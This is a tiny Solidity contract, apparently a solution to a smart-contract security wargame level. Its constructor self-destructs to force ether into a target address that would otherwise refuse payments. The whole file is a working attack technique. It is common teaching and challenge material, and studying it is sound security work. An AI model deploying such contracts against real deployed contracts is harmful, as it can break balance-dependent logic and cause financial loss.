// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackForce {
    constructor(address payable force) public payable {
        selfdestruct(force);
    }
}